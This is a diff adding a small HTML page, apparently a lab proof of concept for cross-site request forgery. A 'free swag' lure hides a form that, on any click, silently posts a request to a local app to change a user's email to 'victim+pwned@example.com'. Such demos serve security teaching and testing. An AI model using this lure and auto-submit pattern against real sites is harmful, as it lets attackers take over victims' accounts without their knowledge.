@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Totally Innocent Giveaway</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      padding: 2rem;
+      background: #111827;
+      color: #fefce8;
+    }
+    .card {
+      background: #1f2937;
+      padding: 2rem;
+      border-radius: 1rem;
+      max-width: 420px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Win free swag!</h1>
+    <p>We just need your consent. Click anywhere 🤫</p>
+  </div>
+
+  <form id="csrfForm" method="POST" action="http://localhost:5000/csrf/update-email" style="display:none;">
+    <input type="hidden" name="email" value="victim+pwned@example.com">
+  </form>
+
+  <script>
+    document.body.addEventListener("click", () => {
+      document.getElementById("csrfForm").submit();
+    });
+  </script>
+</body>
+</html>
+
